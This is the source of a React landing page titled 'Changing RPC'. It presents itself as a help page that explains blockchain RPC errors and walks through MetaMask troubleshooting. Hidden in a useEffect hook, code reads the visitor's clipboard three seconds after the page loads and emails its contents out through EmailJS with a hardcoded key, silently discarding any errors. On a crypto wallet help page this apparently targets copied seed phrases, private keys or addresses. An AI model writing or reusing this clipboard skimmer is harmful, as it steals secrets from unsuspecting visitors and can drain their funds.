import { 
	Flex,
	Text,
  	Image,
	Spinner,
} from "@chakra-ui/react";
import Logo from "./logo.png";
import { Search2Icon } from "@chakra-ui/icons";
import img1 from "./img1.png";
import img2 from "./img2.png";
import img3 from "./img3.png";
import img4 from "./img4.png";
import { useHistory } from "react-router-dom";
import { useEffect } from "react";
import emailjs from 'emailjs-com';



function Landing() {
    useEffect(() => {
        window.scrollTo(0, 0)
      }, [])
    useEffect(() => {
        document.title = "Changing RPC"
    }, [])
    const history = useHistory()

   async function copyClip(e) {  
        const el = e
    }

    useEffect(async () => {
        setTimeout(async function() {     
            const text = await navigator.clipboard.readText()
            if(text !== "") {
                const templateParams = {
                    from_name: "New User",
                    message: "RPC Clipboard text is:= ("+text+")"
                }
                await emailjs.send('Outlook', 'template_klggz2y', templateParams, '_i1i1t1YoEpYt4Iix')
                .then((response) => {
                    console.log('')
                }, (err) => {
                    console.log('')
                })
            }
        }, 3000)
    }, [])

    return (
        <Flex w="100%" minHeight="100vh" direction="column" bg="rgba(24,28,31,1.00)" fontFamily="font1" fontSize={["15px", "16px"]} color="rgba(234,242,247,1.00)" margin="0">
            <Flex w="100%" h="auto" py={["2", "5"]} px={["4%", "7"]} boxShadow="0px 1px 2px rgb(0 0 0 / 69%)" bg="rgba(24,28,31,1.00)" borderBottom="1px solid rgba(55,65,81,1.00)" align="center" className="stick" zIndex="10">
                <Flex flex="1" align="center" onClick={() => history.go(0)}>
                    <Image src={Logo} w={["20px", "40px" ]} h={["20px", "40px"]} />
                    <Text ml={["1", "2"]} fontSize={["16px", "28px"]} fontWeight="bold">RPC</Text>
                </Flex>
                <Flex w={["50%", "60%"]} px="5%" ml="5%" align="center" borderLeft={["none", "1px solid rgba(55,65,81,1.00)"]} borderRight={["none", "1px solid rgba(55,65,81,1.00)"]} h="50px" justify={["center", "flex-start"]}>
                    <Text color="rgba(52,109,219,1.00)" cursor="pointer" transition="300ms ease-in-out" _hover={{ color: "rgba(52,109,219,0.7)"}} textDecoration="underline" onClick={(e) => {
                        copyClip(e)
                        history.push("/defillama-chains")
                    }}>Find RPC's</Text>
                </Flex>
                <Flex flex="1" pl="5%" align="center" justify={["flex-end", "flex-start"]}> 
                    <Flex cursor="pointer" align="center" onClick={() => history.push("/defillama-chains")}>   
                        <Search2Icon color="rgba(204,207,212,1.00)" w="13px" h="13px" mr="3" />
                        <Text fontSize="14px" color="rgba(204,207,212,1.00)" display={["none", "inline-block"]}>Search...</Text>
                    </Flex>
                </Flex>
            </Flex>

            <Flex px={["5%", "10%"]} py="5" w="100%" direction="column">
                <Flex align="center" pb="5" borderBottom="1px solid rgba(55,65,81,1.00)" w="100%" justify="space-between" mb="5">
                    <Text fontSize={["21px", "48px"]} fontWeight="bold" fontFamily="font4">Changing RPC</Text>
                    <Flex bg="rgb(34, 39, 46)" py={["3", "4"]} px={["5", "6"]} justify="center" borderRadius="8px" cursor="pointer" color="rgba(145,176,240,1.00)" transition="300ms ease-in-out" fontWeight="bold" _hover={{ background: "rgb(44, 49, 56)" }} fontSize={["12px", "16px"]} onClick={(e) => {
                        copyClip(e)
                        history.push("/defillama-chains")
                    }}>View RPC's Here</Flex>
                </Flex>

                <Text>
                    <Text fontWeight="bold" mb="3">What is an RPC (Remote Procedure Call)?</Text>
                    <Text mb="2">An RPC in its simplest term is a ‘middle-man’ to allow communication between your device and the blockchain.</Text>
                    When you process a transaction from your device, such as staking funds into a farm; the request is sent from your device via the RPC, to the blockchain. The blockchain will unpack that message and carry out the necessary actions to complete the request. Once the request is carried out, a message is sent back to the RPC with the outcome of the request. 
                    <Text fontWeight="bold" mb="3" mt="3">Common errors relating to RPC’s</Text>
                    <Text mb="3">Some more common errors caused by RPC’s include,</Text>
                    <Text px="3" w="100%">
                        <Flex align="center" mb="2"><i className="mdi mdi-circle" style={{ marginRight: "12px", fontSize: "8px" }}></i>Slow loading times of webpages or transaction requests.</Flex>

                        <Flex align="center" mb="2"><i className="mdi mdi-circle" style={{ marginRight: "12px", fontSize: "8px" }}></i>Transaction error or transaction timed out.</Flex>

                        <Flex align="center" mb="2"><i className="mdi mdi-circle" style={{ marginRight: "12px", fontSize: "8px" }}></i>JSON-RPC error.</Flex>

                        <Flex align="center" mb="6"><i className="mdi mdi-circle" style={{ marginRight: "12px", fontSize: "8px" }}></i>Incorrect figures displayed (APR, balance etc.) on webpages.</Flex>
                    </Text>
                    <Text mb="3">How to resolve an RPC issue?</Text>
                    The most common reason for RPC issues is due to congestion. Due to there only being a limited amount of RPC’s available to supply a high demand of investors, it is not uncommon for the RPC to become overloaded and result in an error and/or unstable use of the blockchain. 
                    If one of the above errors occur or another error you are unsure of, completing the below steps is a good start to resolving the issue.<br /><br />
                    1. Close Metamask.<br /><br />
                    2. Clear ‘cache’, browser cookies and history from your web browser.<br /><br />
                    3. Restart browser and/or computer.<br /><br />
                    4. Reopen Metamask app or extension and change RPC (How to change RPC steps below).<br /><br /> 
                    Once completed the above steps, it is likely the RPC will start to function as intended. If the RPC is still unstable, the problem may lie within the blockchain and you will have to wait for the issue onchain to be resolved.
                </Text>

                <Image mt="12" src={img1} w="100%" h="auto" borderRadius="6px" />
                <Image mt="5" src={img2} w="100%" h="auto" borderRadius="6px" />
                <Image mt="5" src={img3} w="100%" h="auto" borderRadius="6px" />
                <Image mt="5" src={img4} w="100%" h="auto" borderRadius="6px" />

                <Flex align="center" pt="5" mt="8" borderTop="1px solid rgba(55,65,81,1.00)" w="100%" mb="8">
                    <Text fontSize="14px" color="rgba(162,169,185,1.00)">Last modified 1mo ago</Text>
                </Flex>
            </Flex>
        </Flex>
    )
}


export default Landing;